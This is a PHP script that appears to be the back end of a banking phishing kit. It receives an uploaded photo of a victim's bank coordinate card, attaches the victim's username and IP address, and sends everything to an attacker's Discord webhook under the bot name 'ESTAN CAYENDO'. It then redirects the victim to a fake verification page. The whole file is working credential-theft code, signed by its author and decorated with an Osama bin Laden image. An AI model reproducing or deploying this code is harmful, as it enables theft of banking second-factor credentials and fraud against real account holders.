<?php
session_start();

// 1. Incluir configuración central
$configPath = __DIR__ . '/../../config/config.php';
if (!file_exists($configPath)) {
    die("Error: Archivo de configuración no encontrado");
}
require_once($configPath);

// Verificar configuración esencial
if (!defined('DISCORD_WEBHOOK_URL')) {
    die("Error: Discord Webhook URL no configurada");
}

// Verificación mejorada de sesión
if (!isset($_SESSION['username'])) {
    die("Error: No hay usuario en sesión");
}

// Función mejorada para obtener IP
function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'IP no válida';
}

// 2. Procesar la imagen
try {
    if (!isset($_FILES['image1']) || $_FILES['image1']['error'] !== UPLOAD_ERR_OK) {
        throw new Exception("Error en la subida del archivo");
    }

    // Crear directorio uploads si no existe
    $uploadDir = __DIR__ . '/uploads/';
    if (!file_exists($uploadDir) && !mkdir($uploadDir, 0755, true)) {
        throw new Exception("No se pudo crear directorio uploads");
    }

    // Sanitizar nombre de archivo
    $filename = time() . '_' . preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['image1']['name']);
    $filename = substr($filename, 0, 100);
    $uploadFile = $uploadDir . $filename;

    if (!move_uploaded_file($_FILES['image1']['tmp_name'], $uploadFile)) {
        throw new Exception("Error al mover el archivo");
    }

    // 3. Obtener información del usuario
    $ip = getUserIP();
    $uniqueId = strtoupper(substr(md5($ip), 0, 4));

    // 4. Preparar datos para Discord con diseño mejorado
    $embed = [
        "title" => "**🔐 TARJETA DE COORDENADAS RECIBIDA 🔐**",
        "color" => hexdec("e67e22"),  // Color naranja
        "fields" => [
            [
                "name" => "👤 Usuario",
                "value" => "`".$_SESSION['username']."`",
                "inline" => true
            ],
            [
                "name" => "🌍 IP",
                "value" => "`".$ip."`",
                "inline" => true
            ],
            [
                "name" => "🕒 Fecha/Hora",
                "value" => "`".date('Y-m-d H:i:s')."`",
                "inline" => false
            ],
            [
                "name" => "#️⃣ ID de Sesión",
                "value" => "`#".$uniqueId."`",
                "inline" => false
            ]
        ],
        "image" => [
            "url" => "attachment://".$filename
        ],
        "footer" => [
            "text" => "made by @morph3ush4ck",
            "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg"
        ]
    ];

    $payload = [
        "username" => "🚨 ESTAN CAYENDO 🚨",
        "avatar_url" => "https://media.istockphoto.com/id/911660906/vector/computer-hacker-with-laptop-icon.jpg?s=612x612&w=0&k=20&c=rmx25IUnM2fHP4lXG96PNeZ_YQ1kQUTTWfGU4EE5iqQ=",
        "embeds" => [$embed]
    ];

    // 5. Enviar a Discord con cURL
    $ch = curl_init();
    
    $postData = [
        'payload_json' => json_encode($payload),
        'file' => new CURLFile($uploadFile, mime_content_type($uploadFile), $filename)
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_URL => DISCORD_WEBHOOK_URL,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: multipart/form-data'],
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        error_log("Error cURL: " . curl_error($ch));
    } else {
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode !== 200) {
            error_log("Discord respondió con código: $httpCode");
        }
    }
    
    curl_close($ch);

    // 6. Redirigir
    header("Location: ../verificacion.html");
    exit();

} catch (Exception $e) {
    error_log("Error: " . $e->getMessage());
    die("Ocurrió un error. Por favor intenta nuevamente.");
}
?>